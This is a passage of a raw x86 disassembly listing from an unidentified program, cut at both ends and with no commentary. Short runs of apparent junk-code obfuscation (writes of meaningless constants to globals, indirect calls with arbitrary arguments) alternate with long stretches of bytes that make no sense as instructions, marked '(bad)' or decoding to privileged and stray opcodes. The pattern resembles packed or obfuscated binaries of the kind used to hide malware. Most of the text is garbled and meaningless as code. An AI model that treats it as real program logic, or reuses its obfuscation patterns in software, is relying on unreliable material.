  40189a:	jecxz  0x4018fc
  40189c:	adc    dh,0xd9
  40189f:	ja     0x4018da
  4018a1:	mov    cl,0xd2
  4018a3:	clc    
  4018a4:	sub    al,0x6c
  4018a6:	enter  0xad9e,0x4e
  4018aa:	dec    edx
  4018ab:	shl    DWORD PTR [ebp+0x6a7aaee9],0x9a
  4018b2:	push   ecx
  4018b3:	repnz imul eax,DWORD PTR [eax+0x6db27f4e],0xe652b8a6
  4018be:	pop    ebp
  4018bf:	mov    bl,0xa9
  4018c1:	and    al,0x12
  4018c3:	adc    al,0x87
  4018c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018c6:	push   ds
  4018c7:	int    0x4a
  4018c9:	mov    bh,0x6f
  4018cb:	xor    eax,0x6ca454c2
  4018d0:	jecxz  0x4018a4
  4018d2:	sbb    al,0x14
  4018d4:	mov    esp,0x7bd29094
  4018d9:	jb     0x4018b9
  4018db:	pop    edi
  4018dc:	(bad)  
  4018dd:	jmp    0x40188c
  4018df:	sub    dl,bh
  4018e1:	sbb    dh,BYTE PTR [eax+0x1f8b1563]
  4018e7:	dec    esi
  4018e8:	push   ebp
  4018e9:	fisub  WORD PTR [ecx-0x27]
  4018ec:	pop    ds
  4018ed:	mov    ?,WORD PTR [edx+0x44]
  4018f0:	jecxz  0x401953
  4018f2:	test   al,0xd4
  4018f4:	sub    ah,BYTE PTR [ebx-0x6a1237f9]
  4018fa:	aad    0x92
  4018fc:	adc    eax,0x4dfbde7
  401901:	add    DWORD PTR es:[edi],ecx
  401904:	push   0x4577c5b6
  401909:	jne    0x40196f
  40190b:	xor    DWORD PTR [edi-0x7e],ebx
  40190e:	test   al,0x91
  401910:	jp     0x4018d1
  401912:	outs   dx,DWORD PTR ds:[esi]
  401913:	adc    al,0x8
  401915:	jle    0x40189c
  401917:	cs pushf 
  401919:	fsub   st(2),st
  40191b:	(bad)  
  40191c:	or     eax,0x23c62b1
  401921:	out    0x3,al
  401923:	jle    0x401957
  401925:	jbe    0x40196c
  401927:	into   
  401928:	push   eax
  401929:	cmp    al,0x4
  40192b:	lahf   
  40192c:	repnz inc esi
  40192e:	pop    ss
  40192f:	lds    esi,FWORD PTR [edi-0x5e]
  401932:	out    dx,eax
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428237,0x0
  401946:	not    DWORD PTR ds:0x4282af
  40194c:	mov    edi,DWORD PTR ds:0x428153
  401952:	mov    DWORD PTR ds:0x42824f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282bb,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428237,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d3c
  401981:	mov    edx,DWORD PTR ds:0x428357
  401987:	adc    DWORD PTR ds:0x4282bf,edx
  40198d:	and    edx,DWORD PTR ds:0x42820f
  401993:	add    DWORD PTR ds:0x42823f,edx
  401999:	mov    edi,DWORD PTR ds:0x428133
  40199f:	xor    DWORD PTR ds:0x42815b,edi
  4019a5:	and    DWORD PTR ds:0x42812b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42833b
  4019b4:	sub    ecx,DWORD PTR ds:0x42823b
  4019ba:	mov    DWORD PTR ds:0x42833b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42834b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428343,0x339b
  4019e6:	mov    eax,ds:0x422390
  4019eb:	cmp    DWORD PTR ds:0x428227,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428237
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428227,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428247
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e28
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428147
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428137
  401a44:	sub    DWORD PTR ds:0x4282c3,ecx
  401a4a:	add    DWORD PTR ds:0x428143,0x42823b
  401a54:	xor    edx,DWORD PTR ds:0x4282ab
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428153,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428153,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428227
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x4282df,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42822b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428153,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d40
  401ac0:	sub    edx,DWORD PTR ds:0x428363
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42834f
  401ad4:	adc    ecx,DWORD PTR ds:0x42813f
  401ada:	mov    DWORD PTR ds:0x42834f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42813b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428123,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428237,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42814f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42812f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428123,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428e90
  401b3a:	movzx  edx,WORD PTR ds:0x42825f
  401b41:	and    edx,DWORD PTR ds:0x42813b
  401b47:	mov    DWORD PTR ds:0x42825f,edx
  401b4d:	and    DWORD PTR ds:0x428217,edx
  401b53:	add    DWORD PTR ds:0x42835b,edx
  401b59:	sub    edx,DWORD PTR ds:0x428263
  401b5f:	add    DWORD PTR ds:0x42821b,edi
  401b65:	or     edx,DWORD PTR ds:0x428347
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x4282cb,0x0
  401b78:	mov    DWORD PTR ds:0x428263,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428133,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428207
  401ba1:	cmp    DWORD PTR ds:0x4282cb,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d54
  401bc7:	sub    DWORD PTR ds:0x4282b7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42821b
  401bd4:	add    DWORD PTR ds:0x4282c7,edx
  401bda:	add    DWORD PTR ds:0x42811f,ebx
  401be0:	sbb    DWORD PTR ds:0x4281ef,edi
  401be6:	inc    DWORD PTR ds:0x4281ef
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428353,0x4281f7
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xc6b0afeb
  401c11:	jbe    0x401be0
  401c13:	jo     0x401c3a
  401c15:	or     bl,BYTE PTR [eax]
  401c17:	sbb    BYTE PTR [esi+0x6181812],bl
  401c1d:	push   0x14a230de
  401c22:	dec    edx
  401c23:	mov    ebx,0xd09604c2
  401c28:	xchg   edx,eax
  401c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c2a:	ds stos BYTE PTR es:[edi],al
  401c2c:	push   ebp
  401c2d:	lahf   
  401c2e:	neg    DWORD PTR [ebp+0x495b7202]
  401c34:	out    0x1f,al
  401c36:	icebp  
  401c37:	sahf   
  401c38:	cli    
  401c39:	pusha  
  401c3a:	fwait
  401c3b:	jo     0x401c50
  401c3d:	icebp  
  401c3e:	cwde   
  401c3f:	aam    0x1b
  401c41:	pop    ds
  401c42:	mov    ch,0xc3
  401c44:	xchg   edx,eax
  401c45:	stos   BYTE PTR es:[edi],al
  401c46:	cmp    eax,esp
  401c48:	push   cs
  401c49:	or     BYTE PTR [ebx+ebx*4+0x1b14550],bh
  401c50:	sbb    DWORD PTR [edx],0x15ef9539
  401c56:	xchg   edx,eax
  401c57:	sbb    eax,0x59324086
  401c5c:	hlt    
  401c5d:	push   esp
  401c5e:	or     dh,BYTE PTR [esi+0x66d04cd8]
  401c64:	mov    edx,0xbed93bd6
  401c69:	lds    ebp,FWORD PTR [ebx+eax*8]
  401c6c:	xchg   ecx,eax
  401c6d:	icebp  
  401c6e:	add    eax,0x6002119
  401c73:	fidiv  DWORD PTR [eax+eiz*2-0x4b9ff8d8]
  401c7a:	scas   al,BYTE PTR es:[edi]
  401c7b:	mov    ds:0xc39833f,eax
  401c80:	pop    edx
  401c81:	outs   dx,DWORD PTR ds:[esi]
  401c82:	lods   al,BYTE PTR ds:[esi]
  401c83:	sub    cl,BYTE PTR [ebx+0x4c]
  401c86:	adc    eax,0x7516c16a
  401c8b:	sbb    DWORD PTR [ebx+0x54c954ec],ebp
  401c91:	js     0x401c59
  401c93:	mov    ch,0x3c
  401c95:	lea    ebx,[eax-0x6d]
  401c98:	test   DWORD PTR [eax],esp
  401c9a:	inc    ebx
  401c9b:	sbb    al,BYTE PTR [edx-0x7a]
  401c9e:	in     eax,0x57
  401ca0:	sbb    eax,0x9fa2637b
  401ca5:	aas    
  401ca6:	mov    al,0xbb
  401ca8:	add    al,0x5f
  401caa:	stos   BYTE PTR es:[edi],al
  401cab:	cld    
  401cac:	pop    edx
  401cad:	pushf  
  401cae:	dec    ebp
  401caf:	fsub   QWORD PTR [esi-0x68]
  401cb2:	lar    ebx,WORD PTR ds:0x96da24c4
  401cb9:	(bad)  
  401cba:	inc    DWORD PTR [esp+ebp*8-0x3dc73d57]
  401cc1:	jo     0x401ce1
  401cc3:	cmovp  esi,edx
  401cc6:	cmp    bl,BYTE PTR [edi+0x73b9fc3a]
  401ccc:	cmp    BYTE PTR [eax],0x35
  401ccf:	push   ss
  401cd0:	xlat   BYTE PTR ds:[ebx]
  401cd1:	enter  0x606c,0xeb
  401cd5:	mov    ds:0x2b8e5dfe,eax
  401cda:	jns    0x401cc1
  401cdc:	push   esi
  401cdd:	add    BYTE PTR [esi-0x15399ff9],dl
  401ce3:	pop    ss
  401ce4:	jl     0x401cd8
  401ce6:	sbb    eax,0x3732491b
  401ceb:	push   esi
  401cec:	(bad)  
  401ced:	sub    al,0x89
  401cef:	sahf   
  401cf0:	in     eax,dx
  401cf1:	das    
  401cf2:	(bad)  
  401cf3:	adc    BYTE PTR [edi+esi*1-0x491eaed5],ah
  401cfa:	hlt    
  401cfb:	js     0x401d2b
  401cfd:	stos   BYTE PTR es:[edi],al
  401cfe:	out    dx,eax
  401cff:	jle    0x401cab
  401d01:	push   ecx
  401d02:	and    ebp,esi
  401d04:	sbb    ch,BYTE PTR [esi-0x32]
  401d07:	pop    es
  401d08:	pop    esp
  401d09:	ins    DWORD PTR es:[edi],dx
  401d0a:	in     al,0xfa
  401d0c:	jnp    0x401cb7
  401d0e:	mov    ebx,0x68bd3ec7
  401d13:	mov    ecx,0xcd529a87
  401d18:	or     BYTE PTR [ebx],0x7a
  401d1b:	(bad)  
  401d1c:	xor    ebp,eax
  401d1e:	ret    0x4d32
  401d21:	mov    al,ds:0xd5f09531
  401d26:	addr16 enter 0x8557,0xe2
  401d2b:	and    bh,dl
  401d2d:	add    dh,bl
  401d2f:	cmc    
  401d30:	pop    ecx
  401d32:	mov    eax,0x5c5baa9c
  401d37:	pushf  
  401d38:	das    
  401d39:	sub    al,al
  401d3b:	xchg   ebp,eax
  401d3c:	enter  0x953b,0x8d
  401d40:	xor    al,0xce
  401d42:	adc    ebx,DWORD PTR [edi-0x37]
  401d45:	repz hlt 
  401d47:	repnz inc ebp
  401d49:	ret    
  401d4a:	push   es
  401d4b:	(bad)  
  401d4c:	fstp   QWORD PTR ds:0xd95eba95
  401d52:	(bad)  
  401d54:	add    BYTE PTR [eax],ah
  401d56:	int    0x85
  401d58:	xor    eax,0x9d9c33e1
  401d5d:	xchg   esp,eax
  401d5e:	push   eax
  401d5f:	inc    ebx
  401d60:	retf   0x15cd
  401d63:	retf   
  401d64:	(bad)  
  401d65:	adc    al,0xb6
  401d67:	jb     0x401ddc
  401d69:	mov    esi,0x4a06756f
  401d6e:	repnz mov ecx,0x68bccc48
  401d74:	dec    esp
  401d75:	xor    BYTE PTR [eax],bl
  401d77:	adc    DWORD PTR [edx-0x7ae7741c],edx
  401d7d:	(bad)  
  401d7f:	jmp    0xbb1a8a8
  401d84:	mov    al,ds:0x228b8542
  401d89:	out    dx,al
  401d8a:	fadd   QWORD PTR [esi-0xbb30612]
  401d90:	cli    
  401d91:	lea    eax,[ecx-0x18a560c]
  401d97:	je     0x401d20
  401d99:	test   BYTE PTR [esi+ecx*2],dh
  401d9c:	dec    ebx
  401d9d:	arpl   cx,cx
  401d9f:	mov    ch,0x63
  401da1:	rol    DWORD PTR [esi+0x64b8320f],1
  401da7:	retf   0xa99
  401daa:	or     BYTE PTR [ebx-0x3e4e10db],0x42
  401db1:	(bad)  
  401db2:	out    0x64,eax
  401db4:	push   esp
  401db5:	(bad)
  401db9:	jmp    esi
  401dbb:	imul   eax,ebp,0x59
  401dbe:	ror    BYTE PTR [esi+0x4ccde3bb],1
  401dc4:	clc    
  401dc5:	leave  
  401dc6:	mov    edi,0x89c1e319
  401dcb:	retf   0x635c
  401dce:	jmp    0x401dd6
  401dd0:	ins    BYTE PTR es:[edi],dx
  401dd1:	mov    dl,0x98
  401dd3:	clc    
  401dd4:	clc    
  401dd5:	and    edx,DWORD PTR [esi+0x1b]
  401dd8:	enter  0x4a5f,0xf9
  401ddc:	stc    
  401ddd:	ja     0x401d66
  401ddf:	fs imul ebp,edx,0x3249385e
  401de6:	pop    edi
  401de7:	pop    ebp
  401de8:	xchg   eax,esi
  401dea:	lods   al,BYTE PTR ds:[esi]
  401deb:	out    dx,al
  401dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ded:	outs   dx,DWORD PTR ds:[esi]
  401dee:	loop   0x401e2f
  401df0:	mov    bl,0x54
  401df2:	adc    DWORD PTR [esi+ebp*2],0xffffffe2
  401df6:	sbb    eax,esi
  401df8:	sub    dl,BYTE PTR [esi]
  401dfa:	popf   
  401dfb:	xor    al,0xd2
  401dfd:	ja     0x401df9
  401dff:	hlt    
  401e00:	ins    DWORD PTR es:[edi],dx
  401e01:	push   es
  401e02:	test   DWORD PTR [eax+edx*8],eax
  401e05:	fdivp  st(2),st
  401e07:	js     0x401dc2
  401e09:	or     BYTE PTR ds:0x7ff3456,dl
  401e0f:	cmp    eax,DWORD PTR [ecx]
  401e11:	jnp    0x401e68
  401e13:	arpl   WORD PTR [ecx+ecx*2+0x789d40ff],cx
  401e1a:	cmp    dh,BYTE PTR [ebp+0x2170ec10]
  401e20:	in     al,dx
  401e21:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401e23:	ins    DWORD PTR es:[edi],dx
  401e24:	push   es
  401e25:	ret    0xf289
  401e28:	xchg   bl,al
  401e2a:	mov    ss,edi
  401e2c:	into   
  401e2d:	xchg   edi,eax
  401e2e:	dec    ebp
  401e2f:	(bad)  
  401e30:	xchg   ebp,eax
  401e31:	dec    ebx
  401e32:	mov    edi,0x8fd3cd78
  401e37:	sbb    eax,0xf699dd44
  401e3c:	or     dh,cl
  401e3e:	mul    BYTE PTR [edi+0x5f]
  401e41:	xchg   esp,eax
  401e42:	mov    bh,0x85
  401e44:	iret   
  401e45:	push   ss
  401e46:	pop    ss
  401e47:	xor    ebx,DWORD PTR [ecx-0x51]
  401e4a:	mov    BYTE PTR [ebx+0x3b500cda],bl
  401e50:	loopne 0x401e12
  401e52:	mov    bh,0x29
  401e54:	scas   eax,DWORD PTR es:[edi]
  401e55:	shr    bh,1
  401e57:	out    0xf3,eax
  401e59:	gs push edx
  401e5b:	scas   al,BYTE PTR es:[edi]
  401e5c:	ins    DWORD PTR es:[edi],dx
  401e5d:	ins    DWORD PTR es:[edi],dx
  401e5e:	shl    DWORD PTR [ecx+0x2c],cl
  401e61:	mov    dh,dl
  401e63:	xchg   ebx,eax
  401e64:	push   eax
  401e65:	aam    0x1f
  401e67:	hlt    
  401e68:	sub    cl,BYTE PTR [esi+edx*8-0x10f39b32]
  401e6f:	cmp    eax,0x25654bc0
  401e74:	pusha  
  401e75:	pop    ebp
  401e76:	iret   
  401e77:	jle    0x401ea4
  401e79:	push   cs
  401e7a:	fldenv [eax]
  401e7c:	mov    WORD PTR [edi],ds
  401e7e:	arpl   WORD PTR [edi-0x56b9d0de],sp
  401e84:	test   BYTE PTR [eax-0xb1a5a58],dh
  401e8a:	push   ds
  401e8b:	mov    ch,0xd
  401e8d:	jbe    0x401e92
  401e8f:	adc    BYTE PTR [ebx+0x5f],ah
  401e92:	sub    DWORD PTR [ecx-0x59],ebp
  401e95:	cmp    ch,BYTE PTR [esi-0x69]
  401e98:	sub    eax,0xcd3089f
  401e9d:	outs   dx,BYTE PTR ds:[esi]
  401e9e:	mov    esp,DWORD PTR [esi+0x8]
  401ea1:	adc    al,0x14
  401ea3:	xor    al,0x3c
  401ea5:	jne    0x401e9c
  401ea7:	lea    ebp,[edi+ecx*4+0x23c45d4f]
  401eae:	mov    al,0x3c
  401eb0:	xor    BYTE PTR [edi+0x617881c3],cl
  401eb6:	pop    edx
  401eb7:	lods   al,BYTE PTR ds:[esi]
  401eb8:	xchg   edx,eax
  401eb9:	adc    al,0x35
  401ebb:	inc    ebp
  401ebc:	pop    edx
  401ebd:	add    DWORD PTR [ecx+0x16638e10],eax
  401ec3:	paddb  mm4,QWORD PTR [ebx-0x63]
  401ec7:	(bad)  ds:0x9f8e15b1
  401ecd:	jb     0x401f43
  401ecf:	int    0x90
  401ed1:	mov    dl,0x17
  401ed3:	loopne 0x401e59
  401ed5:	and    ebx,0x5528a535
  401edb:	jp     0x401eab
  401edd:	fidivr DWORD PTR [ebx+0x2077e133]
  401ee3:	in     al,dx
  401ee4:	cmp    BYTE PTR [ebp+esi*4-0x50],bl
  401ee8:	in     al,dx
  401ee9:	add    DWORD PTR [esi-0x52],0x5b
  401eed:	dec    edx
  401eee:	sbb    al,0x64
  401ef0:	push   ss
  401ef1:	sbb    bl,BYTE PTR [esi+eax*8-0x2a7dc867]
  401ef8:	adc    DWORD PTR [ecx-0x2e],edx
  401efb:	cmp    al,0xfc
  401efd:	lods   al,BYTE PTR ds:[esi]
  401efe:	cwde   
  401eff:	fucomp st(1)
  401f01:	pop    es
  401f02:	dec    esp
  401f03:	out    0x99,eax
  401f05:	xchg   ebp,eax
  401f06:	mov    edi,0xe1d26440
  401f0b:	xchg   ecx,eax
  401f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f0d:	cwde   
  401f0e:	cld    
  401f0f:	adc    edi,DWORD PTR [ebp-0x5b998939]
  401f15:	jne    0x401f89
  401f17:	cmp    cl,bh
  401f19:	push   eax
  401f1a:	add    ebp,DWORD PTR [esi+0x40]
  401f1d:	lds    eax,FWORD PTR [edi+eax*4+0x9]
  401f21:	outs   dx,BYTE PTR ds:[esi]
  401f22:	push   0x53
  401f24:	add    al,0x9b
  401f26:	je     0x401f99
  401f28:	daa    
  401f29:	mov    ecx,0x161c8cda
  401f2e:	jmp    FWORD PTR [edi]
  401f30:	jne    0x401f5b
  401f32:	mov    WORD PTR [ecx+edx*1],ss
  401f35:	push   es
  401f36:	ss icebp 
  401f38:	xchg   ebp,eax
  401f39:	lock jge 0x401f73
  401f3c:	(bad)  
  401f3d:	jo     0x401f94
  401f3f:	fsubrp st(1),st
  401f41:	(bad)  [ecx-0x49]
  401f44:	inc    esp
  401f45:	ins    BYTE PTR es:[edi],dx
  401f46:	inc    edx
  401f47:	cmp    al,0x31
  401f49:	adc    DWORD PTR [eax+0x5fdb87c],eax
  401f4f:	lahf   
  401f50:	clc    
  401f51:	mov    eax,0x962291c1
  401f56:	xor    BYTE PTR [ebx-0x2e],cl
  401f59:	xchg   ecx,eax
  401f5a:	lock dec edx
  401f5c:	xchg   ebx,eax
  401f5d:	xchg   esi,eax
  401f5e:	or     BYTE PTR ds:0x4ef17ecc,dh
  401f64:	in     al,0x83
  401f66:	xchg   edx,eax
  401f67:	cmp    DWORD PTR [ebx-0x7c],0x43d4bc1d
  401f6e:	mov    bl,0xa2
  401f70:	inc    esi
  401f71:	pop    ss
  401f72:	push   esi
  401f73:	sub    BYTE PTR [edi],0x8a
  401f76:	dec    ecx
  401f77:	test   al,0x40
  401f79:	mov    ds:0x685b23a3,eax
  401f7e:	cmp    al,0xe7
  401f80:	addr16 mov dl,0x9c
  401f83:	cdq    
  401f84:	out    dx,eax
  401f85:	mov    edx,0xd243196a
  401f8a:	cmp    al,0x33
  401f8c:	ror    BYTE PTR [ebp-0xc4094f6],cl
  401f92:	push   ecx
  401f93:	jae    0x401f66
  401f95:	xor    al,0x39
  401f97:	loop   0x401f83
  401f99:	xor    edx,edx
  401f9b:	loopne 0x401fd1
  401f9d:	mov    esp,0x1e07f59
  401fa2:	add    al,0xe2
  401fa4:	outs   dx,DWORD PTR ds:[esi]
  401fa5:	push   es
  401fa6:	fwait
  401fa7:	mov    bh,0xdf
  401fa9:	adc    al,0xa0
  401fab:	mov    bh,dl
  401fad:	int3   
  401fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401faf:	int3   
  401fb0:	inc    esi
  401fb1:	call   0xcf8da392
  401fb6:	sub    bh,ah
  401fb8:	shr    DWORD PTR [edi-0x527574ad],0x3
  401fbf:	fs xchg ebp,eax
  401fc1:	(bad)  
  401fc2:	out    0x16,al
  401fc4:	add    BYTE PTR [eax+ebp*4],0x31
  401fc8:	call   0xbeaa:0x4ac9d6e4
  401fcf:	outs   dx,BYTE PTR ds:[esi]
  401fd0:	cmp    eax,0x969f2d9f
  401fd5:	mov    ecx,0xbad3df68
  401fda:	pushf  
  401fdb:	fs sbb eax,0xc7c45589
  401fe1:	inc    ebp
  401fe2:	nop
  401fe3:	push   ebp
  401fe4:	sub    al,0x0
  401fe6:	add    BYTE PTR [ecx+0x42832b],ah
  401fec:	adc    DWORD PTR ds:0x428367,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42834b,0x0
  402000:	mov    DWORD PTR ds:0x42824b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428333,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42834b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d58
  40203e:	or     DWORD PTR ds:0x42812f,0x6f29
  402048:	xor    DWORD PTR ds:0x4282cb,0x4282bf
  402052:	add    DWORD PTR ds:0x42824b,0x4282e7
  40205c:	and    DWORD PTR ds:0x42835b,edi
  402062:	mov    DWORD PTR ds:0x42823b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42815b,0x42811b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282af,0x0
  402084:	mov    DWORD PTR ds:0x4282ab,ecx
  40208a:	mov    DWORD PTR ds:0x428157,0x59f
  402094:	mov    DWORD PTR ds:0x428157,ecx
  40209a:	mov    DWORD PTR ds:0x4282d7,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282af,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42812b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428e94
  4020ce:	sbb    DWORD PTR ds:0x42833b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282bb,0x42822f
  4020e2:	adc    DWORD PTR ds:0x42832f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42832f,0x42835f
  4020f6:	and    DWORD PTR ds:0x428117,0x428333
  402100:	sbb    DWORD PTR ds:0x42811b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282af,0x42825f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282ab
  40213c:	add    DWORD PTR ds:0x428247,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42833b
  40214e:	add    DWORD PTR ds:0x4282d7,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428127,0x0
  402162:	mov    DWORD PTR ds:0x42834b,0x750f
  40216c:	not    DWORD PTR ds:0x428333
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42822b,0x610f
  402181:	mov    eax,ds:0x42813f
  402186:	cmp    DWORD PTR ds:0x428127,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428029
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e30
  4021b1:	adc    DWORD PTR ds:0x42824f,0x428223
  4021bb:	add    DWORD PTR ds:0x42820f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282b3,0x428153
  4021cf:	or     DWORD PTR ds:0x428353,0xa53
  4021d9:	mov    eax,ds:0x428207
  4021de:	xor    DWORD PTR ds:0x42811b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbc9363c7
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi+0x8181812],bl
  40220e:	xor    al,0x2
  402210:	fisttp WORD PTR [edi]
  402212:	jle    0x4021b5
  402214:	cmp    BYTE PTR [edi-0x16],ch
  402217:	adc    esp,DWORD PTR [ebp+0x6796c373]
  40221d:	jmp    0xbc9d5d2c
  402222:	(bad)
  402226:	loop   0x402207
  402228:	xor    dh,BYTE PTR [ebx-0x5e]
  40222b:	mov    ebp,0xa88dd4d2
  402230:	call   esi
  402232:	scas   al,BYTE PTR es:[edi]
  402233:	mov    bl,ah
  402235:	and    eax,0x8d79a0e4
  40223a:	push   ebx
  40223b:	fstp   DWORD PTR [eax]
  40223d:	push   0xffffffcd
  40223f:	jmp    0x402288
  402241:	(bad)  
  402242:	aaa    
  402243:	mov    ecx,0x6f93ca6f
  402248:	xchg   ecx,eax
  402249:	jbe    0x4021f7
  40224b:	in     al,0x99
  40224d:	mov    edi,0x862e2ab0
  402252:	mov    cl,BYTE PTR [ecx+ebp*2+0x21]
  402256:	stos   DWORD PTR es:[edi],eax
  402257:	ret    0xddbc
  40225a:	sub    al,0xaa
  40225c:	mov    bh,bh
  40225e:	pop    ss
  40225f:	cld    
  402260:	xchg   edi,eax
  402261:	inc    edx
  402262:	je     0x402235
  402264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402265:	sbb    ebx,DWORD PTR [edx]
  402267:	adc    al,0xfb
  402269:	dec    esi
  40226a:	cmc    
  40226b:	cmp    ah,ah
  40226d:	cmp    ecx,esp
  40226f:	cli    
  402270:	mov    ecx,0xb1bfd13b
  402275:	stc    
